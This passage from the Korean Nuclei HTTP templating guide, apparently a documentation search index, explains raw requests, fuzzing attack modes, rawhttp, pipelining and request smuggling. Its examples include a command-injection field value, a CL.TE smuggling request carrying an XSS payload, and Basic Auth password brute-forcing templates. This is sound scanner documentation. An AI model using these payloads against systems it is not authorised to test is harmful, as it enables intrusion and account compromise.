\ud2b9\ud788 \uc720\uc6a9\ud569\ub2c8\ub2e4. \ucd08\uae30 \uc694\uccad \uc774\ud6c4\uc5d0 \ud558\ub098\uc758 \uc694\uccad\uc744 \ud2b9\uc815 \ud638\uc2a4\ud2b8\uc5d0 \ub300\ud574 \uc218\ud589\ud574\uc57c \ud558\ub294 \uacbd\uc6b0(\uc608: API \uc720\ud6a8\uc131 \uac80\uc0ac): http : - raw : # this request will be sent to {{Hostname}} to get the token - | GET /getkey HTTP/1.1 Host: {{Hostname}} # This request will be sent instead to https://api.target.com:443 to verify the token validity - | @Host: https://api.target.com:443 GET /api/key={{token}} HTTP/1.1 Host: api.target.com:443 extractors : - type : regex name : token part : body regex : # random extractor of strings between prefix and suffix - 'prefix(.*)suffix' matchers : - type : word part : body words : - valid token \uc0ac\uc6a9\uc790 \uc9c0\uc815 timeout \uc8fc\uc11d\uc758 \uc608 - - | @timeout: 25s POST /conf_mail.php HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M","title":"Http"},{"location":"kr/templating-guide/protocols/http/#headers","text":"Headers\ub294 \uc694\uccad\uacfc \ud568\uaed8 \ubcf4\ub0b4\ub3c4\ub85d \uc9c0\uc815\ud560 \uc218\ub3c4 \uc788\uc2b5\ub2c8\ub2e4. \ud5e4\ub354\ub294 \ud0a4/\uac12 \uc30d\uc758 \ud615\ud0dc\ub85c \ubc30\uce58\ub429\ub2c8\ub2e4. \ud5e4\ub354 \uad6c\uc131\uc758 \uc608\ub294 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4: # headers contain the headers for the request headers : # Custom user-agent header User-Agent : Some-Random-User-Agent # Custom request origin Origin : https://google.com","title":"Headers"},{"location":"kr/templating-guide/protocols/http/#body","text":"Body\ub294 \uc694\uccad\uacfc \ud568\uaed8 \ubcf4\ub0bc \ubcf8\ubb38\uc744 \uc9c0\uc815\ud569\ub2c8\ub2e4. \uc608\ub97c \ub4e4\uc5b4: # Body\ub294 \uc694\uccad\uacfc \ud568\uaed8 \uc804\uc1a1\ub418\ub294 \ubb38\uc790\uc5f4\uc785\ub2c8\ub2e4. body : \"{\\\"some random JSON\\\"}\" # Body\ub294 \uc694\uccad\uacfc \ud568\uaed8 \uc804\uc1a1\ub418\ub294 \ubb38\uc790\uc5f4\uc785\ub2c8\ub2e4. body : \"admin=test\"","title":"Body"},{"location":"kr/templating-guide/protocols/http/#session","text":"\uc5ec\ub7ec \uc694\uccad \uac04\uc5d0 \uc138\uc158\uacfc \uac19\uc740 \ucfe0\ud0a4 \uae30\ubc18 \ube0c\ub77c\uc6b0\uc800\ub97c \uc720\uc9c0\ud558\ub824\uba74 \ud15c\ud50c\ub9bf\uc5d0\uc11c cookie-reuse: true \ub97c \uc0ac\uc6a9\ud558\uba74 \ub429\ub2c8\ub2e4. \uc775\uc2a4\ud50c\ub85c\uc787 \uccb4\uc778\uc744 \uc644\ub8cc\ud558\uace0 \uc778\uc99d\ub41c \uc2a4\uce94\uc744 \uc218\ud589\ud558\uae30 \uc704\ud574 \uc77c\ub828\uc758 \uc694\uccad \uac04\uc5d0 \uc138\uc158\uc744 \uc720\uc9c0\ud558\ub824\ub294 \uacbd\uc6b0\uc5d0 \uc720\uc6a9\ud569\ub2c8\ub2e4. # cookie-reuse\ub294 \uae30\ubcf8\uc801\uc73c\ub85c \ubd80\uc6b8 \uc785\ub825 \ubc0f false\ub97c \ud5c8\uc6a9\ud569\ub2c8\ub2e4. cookie-reuse : true","title":"Session"},{"location":"kr/templating-guide/protocols/http/#request-condition","text":"\uc694\uccad \uc870\uac74\uc744 \uc0ac\uc6a9\ud558\uba74 \ubcf5\uc7a1\ud55c \uac80\uc0ac\ub97c \uc791\uc131\ud558\uae30 \uc704\ud55c \uc5ec\ub7ec \uc694\uccad\uacfc \uc775\uc2a4\ud50c\ub85c\uc787 \uccb4\uc778\uc744 \uc644\ub8cc\ud558\uae30 \uc704\ud55c \uc5ec\ub7ec HTTP \uc694\uccad\uc744 \ud3ec\ud568\ud558\ub294 \uc775\uc2a4\ud50c\ub85c\uc787 \uac04\uc758 \uc870\uac74\uc744 \ud655\uc778\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. DSL \ub9e4\ucc98\uc640 \ud568\uaed8 req-condition: true \uc640 \uac01 \uc18d\uc131\uc758 \uc811\ubbf8\uc0ac\ub85c \uc22b\uc790\ub97c \ucd94\uac00\ud558\uc5ec \ud65c\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4(\uc608: status_code_1 , status_code_3 , body_2 ). req-condition : true matchers : - type : dsl dsl : - \"status_code_1 == 404 && status_code_2 == 200 && contains((body_2), 'secret_string')\"","title":"Request Condition"},{"location":"kr/templating-guide/protocols/http/#example-http-template","text":"\uc704\uc5d0\uc11c \uc5b8\uae09\ud55c .git/config \ud30c\uc77c\uc758 \ucd5c\uc885 \ud15c\ud50c\ub9bf \ud30c\uc77c\uc740 \ub2e4\uc74c\uacfc \uac19\uc2b5\ub2c8\ub2e4. id : git-config info : name : Git Config File author : Ice3man severity : medium description : Searches for the pattern /.git/config on passed URLs. http : - method : GET path : - \"{{BaseURL}}/.git/config\" matchers : - type : word words : - \"[core]\"","title":"Example HTTP Template"},{"location":"kr/templating-guide/protocols/http/#raw-http-requests","text":"\uc694\uccad\uc744 \uc0dd\uc131\ud558\ub294 \ub610 \ub2e4\ub978 \ubc29\ubc95\uc740 \ub2e4\uc74c\uacfc \uac19\uc740 DSL \ub3c4\uc6b0\ubbf8 \uae30\ub2a5\uc744 \ub354 \uc720\uc5f0\ud558\uac8c \uc9c0\uc6d0\ud558\uace0 \uc9c0\uc6d0\ud558\ub294 Raw \uc694\uccad\uc744 \uc0ac\uc6a9\ud558\ub294 \uac83\uc785\ub2c8\ub2e4(\ud604\uc7ac\ub85c\uc11c\ub294 {{Hostname}} ), \ubaa8\ub4e0 Matcher, Extractor \uae30\ub2a5\uc740 \uc704\uc5d0\uc11c \uc124\uba85\ud55c \uac83\uacfc \ub3d9\uc77c\ud55c \ubc29\uc2dd\uc73c\ub85c RAW \uc694\uccad\uacfc \ud568\uaed8 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. http : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded a=test&b=pd \uc6d0\ud558\ub294 \ub300\ub85c \uc815\ud655\ud55c \uc791\uc5c5\uc744 \uc218\ud589\ud558\ub3c4\ub85d \uc694\uccad\uc744 \ubbf8\uc138 \uc870\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Nuclei \uc694\uccad\uc740 \uc644\uc804\ud788 \uad6c\uc131\ud560 \uc218 \uc788\uc74c\uc744 \uc758\ubbf8\ud569\ub2c8\ub2e4. \uc989, \ub300\uc0c1 \uc11c\ubc84\ub85c \ubcf4\ub0bc \uc694\uccad\uc5d0 \ub300\ud55c \ubaa8\ub4e0 \uac83\uc744 \uad6c\uc131\ud558\uace0 \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. RAW \uc694\uccad \ud615\uc2dd\uc740 various helper functions \ub3c4 \uc9c0\uc6d0\ud558\ubbc0\ub85c \uc785\ub825\uc73c\ub85c \ub7f0\ud0c0\uc784 \uc870\uc791\uc774 \uac00\ub2a5\ud569\ub2c8\ub2e4. \ud5e4\ub354\uc5d0 \ub3c4\uc6b0\ubbf8 \ud568\uc218\ub97c \uc0ac\uc6a9\ud558\ub294 \uc608\uc785\ub2c8\ub2e4. raw : - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time. \ucd94\uac00 \ubcc0\uc870 \uc5c6\uc774 \uc785\ub825\uc73c\ub85c \uc9c0\uc815\ub41c URL\uc5d0 \ub300\ud55c \uc694\uccad\uc744 \uc218\ud589\ud558\ub824\uba74 \uc544\ub798 \uc9c0\uc815\ub41c \ub300\ub85c \ube48 \uc694\uccad URI\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc0ac\uc6a9\uc790 \uc9c0\uc815 \uc785\ub825\uc5d0 \ub300\ud55c \uc694\uccad\uc744 \uc218\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. raw : - | GET HTTP/1.1 Host: {{Hostname}}","title":"RAW HTTP requests"},{"location":"kr/templating-guide/protocols/http/#http-fuzzing","text":"Info Nuclei engine supports fuzzing module that allow to run various type of payloads in multiple format, It's possible to define placeholders with simple keywords (or using brackets {{helper_function(variable)}} in case mutator functions are needed), and perform batteringram , pitchfork and clusterbomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. \ud398\uc774\ub85c\ub4dc\ub294 \ubcc0\uc218 \uc774\ub984\uc744 \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub418\uba70 \u00a7 \u00a7 \ub610\ub294 {{ }} \ub9c8\ucee4 \uc0ac\uc774\uc5d0\uc11c \uc694\uccad\uc5d0\uc11c \ucc38\uc870\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ub85c\uceec \ub2e8\uc5b4 \ubaa9\ub85d\uacfc \ud568\uaed8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\ub294 \uc608: # HTTP Intruder fuzzing using local wordlist. payloads : paths : params.txt header : local.txt \ud15c\ud50c\ub9bf \ub2e8\uc5b4 \ubaa9\ub85d \uc9c0\uc6d0\uacfc \ud568\uaed8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\ub294 \uc608: # HTTP Intruder fuzzing using in template wordlist. payloads : password : - admin - guest - password Note: \uc608\uae30\uce58 \uc54a\uc740 \uc785\ub825\uc774 \ud15c\ud50c\ub9bf\uc744 \uc190\uc0c1\uc2dc\ud0a4\ubbc0\ub85c \uacf5\uaca9 \uc720\ud615\uc744 \uc120\ud0dd\ud560 \ub54c \uc8fc\uc758\ud558\uc2ed\uc2dc\uc624. \uc608\ub97c \ub4e4\uc5b4 clusterbomb \ub610\ub294 pitchfork \ub97c \uacf5\uaca9 \uc720\ud615\uc73c\ub85c \uc0ac\uc6a9\ud558\uace0 \ud398\uc774\ub85c\ub4dc \uc139\uc158\uc5d0 \ud558\ub098\uc758 \ubcc0\uc218\ub9cc \uc815\uc758\ud55c \uacbd\uc6b0 clusterbomb \ub610\ub294 pitchfork \uac00 \ud15c\ud50c\ub9bf\uc5d0\uc11c \ub458 \uc774\uc0c1\uc758 \ubcc0\uc218\ub97c \uc0ac\uc6a9\ud560 \uac83\uc73c\ub85c \uc608\uc0c1\ud558\ubbc0\ub85c \ud15c\ud50c\ub9bf\uc740 \ucef4\ud30c\uc77c\ub418\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4.","title":"HTTP Fuzzing"},{"location":"kr/templating-guide/protocols/http/#attack-mode","text":"Nuclei \uc5d4\uc9c4\uc740 \uc77c\ubc18\uc801\uc73c\ub85c \ub2e8\uc77c \ub9e4\uac1c\ubcc0\uc218\ub97c \ud37c\uc9d5\ud558\ub294 \ub370 \uc0ac\uc6a9\ub418\ub294 \uae30\ubcf8 \uc720\ud615\uc778 batteringram , \ud074\ub798\uc2dd burp \uce68\uc785\uc790\uc640 \ub3d9\uc77c\ud558\uac8c \uc791\ub3d9\ud558\ub294 \uc5ec\ub7ec \ub9e4\uac1c\ubcc0\uc218\ub97c \ud37c\uc9d5\ud558\ub294 clusterbomb \ubc0f pitchfork \ub97c \ud3ec\ud568\ud55c \uc5ec\ub7ec \uacf5\uaca9 \uc720\ud615\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. Type batteringram pitchfork clusterbomb Support batteringram batteringram \uacf5\uaca9 \uc720\ud615\uc740 \ubaa8\ub4e0 \uc704\uce58\uc5d0 \ub3d9\uc77c\ud55c \ud398\uc774\ub85c\ub4dc \uac12\uc744 \ubc30\uce58\ud569\ub2c8\ub2e4. \ud558\ub098\uc758 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub9cc \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \ubc18\ubcf5\ud558\uace0 \ubaa8\ub4e0 \uc704\uce58\ub97c \ud398\uc774\ub85c\ub4dc \uac12\uc73c\ub85c \ubc14\uafc9\ub2c8\ub2e4. pitchfork pitchfork \uacf5\uaca9 \uc720\ud615\uc740 \uac01 \uc704\uce58\uc5d0 \ub300\ud574 \ud558\ub098\uc758 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uccab \ubc88\uc9f8 \uc704\uce58\uc5d0 \ubc30\uce58\ud558\uace0 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \ub450 \ubc88\uc9f8 \uc704\uce58\uc5d0 \ubc30\uce58\ud558\ub294 \uc2dd\uc785\ub2c8\ub2e4. \uadf8\ub7f0 \ub2e4\uc74c \ub3d9\uc2dc\uc5d0 \ubaa8\ub4e0 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \ubc18\ubcf5\ud569\ub2c8\ub2e4. \uccab \ubc88\uc9f8 \uc694\uccad\uc740 \uac01 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc758 \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\uace0, \ub450 \ubc88\uc9f8 \uc694\uccad\uc740 \uac01 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc758 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\ub294 \uc2dd\uc785\ub2c8\ub2e4. clusterbomb \ud074\ub7ec\uc2a4\ud130 \ud3ed\ud0c4 \uacf5\uaca9\uc740 \ub2e4\uc591\ud55c \ud398\uc774\ub85c\ub4dc \uc870\ud569\uc744 \uc2dc\ub3c4\ud569\ub2c8\ub2e4. \uc5ec\uc804\ud788 \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uccab \ubc88\uc9f8 \uc704\uce58\uc5d0 \ubc30\uce58\ud558\uace0 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \ub450 \ubc88\uc9f8 \uc704\uce58\uc5d0 \ubc30\uce58\ud569\ub2c8\ub2e4. \uadf8\ub7ec\ub098 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \ubc18\ubcf5\ud560 \ub54c \ubaa8\ub4e0 \uc870\ud569\uc744 \uc2dc\ub3c4\ud569\ub2c8\ub2e4. \uadf8\ub7f0 \ub2e4\uc74c \ub3d9\uc2dc\uc5d0 \ubaa8\ub4e0 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \ubc18\ubcf5\ud569\ub2c8\ub2e4. \uccab \ubc88\uc9f8 \uc694\uccad\uc740 \uac01 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc758 \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\uace0, \ub450 \ubc88\uc9f8 \uc694\uccad\uc740 \uac01 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc758 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\ub294 \uc2dd\uc785\ub2c8\ub2e4. \uc774 \uacf5\uaca9 \uc720\ud615\uc740 \ubb34\ucc28\ubcc4 \ub300\uc785 \uacf5\uaca9\uc5d0 \uc720\uc6a9\ud569\ub2c8\ub2e4. \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc5d0\uc11c \uc77c\ubc18\uc801\uc73c\ub85c \uc0ac\uc6a9\ub418\ub294 \uc0ac\uc6a9\uc790 \uc774\ub984 \ubaa9\ub85d\uc744 \ub85c\ub4dc\ud558\uace0 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc5d0\uc11c \uc77c\ubc18\uc801\uc73c\ub85c \uc0ac\uc6a9\ub418\ub294 \ube44\ubc00\ubc88\ud638 \ubaa9\ub85d\uc744 \ub85c\ub4dc\ud569\ub2c8\ub2e4. \ud074\ub7ec\uc2a4\ud130 \ud3ed\ud0c4 \uacf5\uaca9\uc740 \ubaa8\ub4e0 \uc870\ud569\uc744 \uc2dc\ub3c4\ud569\ub2c8\ub2e4. \uc790\uc138\ud55c \ub0b4\uc6a9\uc740 here . fuzz\uc5d0 clusterbomb \uacf5\uaca9\uc744 \uc0ac\uc6a9\ud55c \uc608. http : - raw : - | POST /?file={{path}} HTTP/1.1 User-Agent: {{header}} Host: {{Hostname}} payloads : path : helpers/wordlists/prams.txt header : helpers/wordlists/header.txt attack : clusterbomb # Defining HTTP fuzz attack type","title":"Attack mode"},{"location":"kr/templating-guide/protocols/http/#unsafe-http-requests","text":"Nuclei\ub294 HTTP reqeust smuggling, Host header injection, \uc798\ubabb\ub41c \ubb38\uc790\uac00 \ud3ec\ud568\ub41c CRLF \ub4f1\uacfc \uac19\uc740 \ubb38\uc81c\uc5d0 \ub300\ud574 **any kind of malformed requests**\uc744 \ud5c8\uc6a9\ud558\ub294 \uc644\uc804\ud55c \uc694\uccad \uc81c\uc5b4 \ubc0f \uc9c0\uc815\uc744 \uc704\ud55c rawhttp \ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub294 \uae30\ubcf8\uc801\uc73c\ub85c \ube44\ud65c\uc131\ud654\ub418\uc5b4 \uc788\uc73c\uba70 \uc694\uccad \ube14\ub85d\uc5d0 unsafe: true \ub97c \ud3ec\ud568\ud558\uc5ec \ud65c\uc131\ud654\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ub2e4\uc74c\uc740 rawhttp \ub97c \uc0ac\uc6a9\ud55c HTTP \uc694\uccad \ubc00\uc218 \ud0d0\uc9c0 \ud15c\ud50c\ub9bf\uc758 \uc608\uc785\ub2c8\ub2e4. http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - |+ GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} unsafe : true # Enables rawhttp client matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")'","title":"Unsafe HTTP Requests"},{"location":"kr/templating-guide/protocols/http/#advance-fuzzing","text":"\uc6b0\ub9ac\ub294 \uc6f9 \uc11c\ubc84\uc758 \uace0\uae09 \ud37c\uc9d5\uc744 \ud5c8\uc6a9\ud558\uae30 \uc704\ud574 nuclei\uc744 \uac15\ud654\ud588\uc2b5\ub2c8\ub2e4. \uc774\uc81c \uc0ac\uc6a9\uc790\ub294 \uc5ec\ub7ec \uc635\uc158\uc744 \uc0ac\uc6a9\ud558\uc5ec HTTP \ud37c\uc9d5 \uc6cc\ud06c\ud50c\ub85c\ub97c \uc870\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4.","title":"Advance Fuzzing"},{"location":"kr/templating-guide/protocols/http/#pipelining","text":"HTTP \ud30c\uc774\ud504\ub77c\uc774\ub2dd \uc9c0\uc6d0\uc774 \ucd94\uac00\ub418\uc5b4 \ub2e4\uc74c\uc5d0\uc11c \uc601\uac10\uc744 \ubc1b\uc740 \ub3d9\uc77c\ud55c \uc5f0\uacb0\uc5d0\uc11c \uc5ec\ub7ec HTTP \uc694\uccad\uc744 \ubcf4\ub0bc \uc218 \uc788\uc2b5\ub2c8\ub2e4. http-desync-attacks-request-smuggling-reborn . HTTP \ud30c\uc774\ud504\ub77c\uc778 \uae30\ubc18 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\uae30 \uc804\uc5d0 \uc2e4\ud589 \uc911\uc778 \ub300\uc0c1\uc774 HTTP \ud30c\uc774\ud504\ub77c\uc778 \uc5f0\uacb0\uc744 \uc9c0\uc6d0\ud558\ub294\uc9c0 \ud655\uc778\ud558\uc2ed\uc2dc\uc624. \uadf8\ub807\uc9c0 \uc54a\uc73c\uba74 \ud575 \uc5d4\uc9c4\uc774 \ud45c\uc900 HTTP \uc694\uccad \uc5d4\uc9c4\uc73c\ub85c \ud3f4\ubc31\ud569\ub2c8\ub2e4. \uc8fc\uc5b4\uc9c4 \ub3c4\uba54\uc778 \ub610\ub294 \ud558\uc704 \ub3c4\uba54\uc778 \ubaa9\ub85d\uc774 HTTP \ud30c\uc774\ud504\ub77c\uc774\ub2dd\uc744 \uc9c0\uc6d0\ud558\ub294\uc9c0 \ud655\uc778\ud558\ub824\uba74 httpx \uc5d0 -pipeline \ud50c\ub798\uadf8\uac00 \uc788\uc2b5\ub2c8\ub2e4. nuclei\uc758 \ud30c\uc774\ud504\ub77c\uc774\ub2dd \uc18d\uc131\uc744 \ud45c\uc2dc\ud558\ub294 \uad6c\uc131\uc758 \uc608\uc785\ub2c8\ub2e4. unsafe : true pipeline : true pipeline-concurrent-connections : 40 pipeline-requests-per-connection : 25000 nuclei\uc758 \ud30c\uc774\ud504\ub77c\uc774\ub2dd \uae30\ub2a5\uc744 \ubcf4\uc5ec\uc8fc\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc774 \uc544\ub798\uc5d0 \uc81c\uacf5\ub418\uc5c8\uc2b5\ub2c8\ub2e4. id : pipeline-testing info : name : pipeline testing author : pdteam severity : info http : - raw : - |+ GET /{{path}} HTTP/1.1 Host: {{Hostname}} Referer: {{BaseURL}} attack : batteringram payloads : path : path_wordlist.txt unsafe : true pipeline : true pipeline-concurrent-connections : 40 pipeline-requests-per-connection : 25000 matchers : - type : status part : header status : - 200","title":"Pipelining"},{"location":"kr/templating-guide/protocols/http/#connection-pooling","text":"\uc774\uc804 \ubc84\uc804\uc758 nuclei\ub294 \uc5f0\uacb0 \ud480\ub9c1\uc744 \uc218\ud589\ud558\uc9c0 \uc54a\uc558\uc9c0\ub9cc \uc774\uc81c \uc0ac\uc6a9\uc790\ub294 HTTP \uc5f0\uacb0 \ud480\ub9c1\uc744 \uc0ac\uc6a9\ud558\uac70\ub098 \uc0ac\uc6a9\ud558\uc9c0 \uc54a\ub3c4\ub85d \ud15c\ud50c\ub9bf\uc744 \uad6c\uc131\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 \uc694\uad6c \uc0ac\ud56d\uc5d0 \ub530\ub77c \ub354 \ube60\ub978 \uc2a4\uce94\uc774 \uac00\ub2a5\ud569\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc5f0\uacb0 \ud480\ub9c1\uc744 \ud65c\uc131\ud654\ud558\ub824\uba74 \ud398\uc774\ub85c\ub4dc \uc139\uc158\uc5d0\uc11c \uc0ac\uc6a9\ud558\ub824\ub294 \uac01 \uc2a4\ub808\ub4dc \uc218\ub85c threads \uc18d\uc131\uc744 \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Connection: Close \ud5e4\ub354\ub294 HTTP \uc5f0\uacb0 \ud480\ub9c1 \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. \uadf8\ub807\uc9c0 \uc54a\uc73c\uba74 \uc5d4\uc9c4\uc774 \uc2e4\ud328\ud558\uace0 \ud480\ub9c1\uc774 \uc788\ub294 \ud45c\uc900 HTTP \uc694\uccad\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. HTTP \uc5f0\uacb0 \ud480\ub9c1\uc744 \uc0ac\uc6a9\ud558\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf- id : fuzzing-example info : name : Connection pooling example author : pdteam severity : info http : - raw : - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:\u00a7password\u00a7')}} attack : batteringram payloads : password : password.txt threads : 40 matchers-condition : and matchers : - type : status status : - 200 - type : word words : - \"Unique string\" part : body","title":"Connection pooling"},{"location":"kr/templating-guide/protocols/http/#smuggling","text":"HTTP Smuggling\uc740 \ucd5c\uadfc Portswigger's Research \uc5d0\uc11c \ud654\uc81c\uac00 \ub41c \uc6f9 \uacf5\uaca9 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4. \uc790\uc138\ud55c \uac1c\uc694\ub294 \uc704\uc5d0 \ub9c1\ud06c\ub41c \uae30\uc0ac\ub97c \ucc38\uc870\ud558\uc2ed\uc2dc\uc624. \uc624\ud508 \uc18c\uc2a4 \uacf5\uac04\uc5d0\uc11c http \ubc00\uc218 \ud0d0\uc9c0\ub294 \ud2b9\ud788 \ud0d0\uc9c0 \uc694\uccad\uc758 \ud2b9\uc131\uc0c1 \uae30\ud615\uc801\uc774\uae30 \ub54c\ubb38\uc5d0 \ud0d0\uc9c0\uac00 \uc5b4\ub835\uc2b5\ub2c8\ub2e4. Nuclei\ub294 rawhttp \uc5d4\uc9c4\uc744 \ud65c\uc6a9\ud558\uc5ec HTTP Smuggling \ucde8\uc57d\uc810\uc744 \uc548\uc815\uc801\uc73c\ub85c \ud0d0\uc9c0\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. HTTP Smuggling \ucde8\uc57d\uc810\uc758 \uac00\uc7a5 \uae30\ubcf8\uc801\uc778 \uc608\ub294 CL.TE Smuggling\uc785\ub2c8\ub2e4. rawhttp \uae30\ubc18 \uc694\uccad\uc5d0 \ub300\ud574 unsafe: true \uc18d\uc131\uc744 \uc0ac\uc6a9\ud558\uc5ec CE.TL HTTP Smuggling \ucde8\uc57d\uc810\uc744 \uac10\uc9c0\ud558\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc774 \uc544\ub798\uc5d0 \uc81c\uacf5\ub429\ub2c8\ub2e4. id : CL-TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : word words : - 'Unrecognized method GPOST' \ub354 \ub9ce\uc740 \uc608\uc81c\ub294 \ub2e4\uc74c\uc5d0\uc11c \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. template-examples section for smuggling templates.","title":"Smuggling"},{"location":"kr/templating-guide/protocols/http/#race-conditions","text":"\uacbd\uc7c1 \uc870\uac74\uc740 \uae30\uc874 \ub3c4\uad6c\ub97c \ud1b5\ud574 \uc27d\uac8c \uc790\ub3d9\ud654\ub418\uc9c0 \uc54a\ub294 \ub610 \ub2e4\ub978 \uc720\ud615\uc758 \ubc84\uadf8\uc785\ub2c8\ub2e4. Burp Suite\ub294 \ubaa8\ub4e0 \uc694\uccad\uc5d0 \ub300\ud55c \ubaa8\ub4e0 \ubc14\uc774\ud2b8\uac00 \uc804\uc1a1 \uc774\ubca4\ud2b8\ub97c \ub3d9\uae30\ud654\ud558\ub294 \ubaa8\ub4e0 \uc694\uccad\uc5d0 \ub300\ud574 \ud568\uaed8 \uc804\uc1a1\ub418\ub294 \ud55c \ubc88\uc5d0 \ub9c8\uc9c0\ub9c9 \ubc14\uc774\ud2b8\ub97c \uc608\uc0c1\ud558\ub294 Turbo Intruder\uc5d0 \uac8c\uc774\ud2b8 \uba54\ucee4\ub2c8\uc998\uc744 \ub3c4\uc785\ud588\uc2b5\ub2c8\ub2e4. \uc6b0\ub9ac\ub294 Nuclei \uc5d4\uc9c4\uc5d0 Gate \uba54\ucee4\ub2c8\uc998\uc744 \uad6c\ud604\ud588\uc73c\uba70 \ud15c\ud50c\ub9bf\uc744 \ud1b5\ud574 \uc2e4\ud589\ud560 \uc218 \uc788\ub3c4\ub85d \ud558\uc5ec \uc774 \ud2b9\uc815 \ubc84\uadf8 \ud074\ub798\uc2a4\uc5d0 \ub300\ud55c \ud14c\uc2a4\ud2b8\ub97c \uac04\ub2e8\ud558\uace0 \uc774\uc2dd \uac00\ub2a5\ud558\uac8c \ub9cc\ub4ed\ub2c8\ub2e4. \ud15c\ud50c\ub9bf \ub0b4\uc5d0\uc11c \uacbd\uc7c1 \uc870\uac74 \ud655\uc778\uc744 \ud65c\uc131\ud654\ud558\ub824\uba74 race \uc18d\uc131\uc744 true \ub85c \uc124\uc815\ud558\uace0 race_count \ub294 \uc2dc\uc791\ud558\ub824\ub294 \ub3d9\uc2dc \uc694\uccad \uc218\ub97c \uc815\uc758\ud569\ub2c8\ub2e4. \ub2e4\uc74c\uc740 \uac8c\uc774\ud2b8 \ub85c\uc9c1\uc744 \uc0ac\uc6a9\ud558\uc5ec \ub3d9\uc77c\ud55c \uc694\uccad\uc774 10\ubc88 \ubc18\ubcf5\ub418\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc785\ub2c8\ub2e4. id : race-condition-testing info : name : Race condition testing author : pdteam 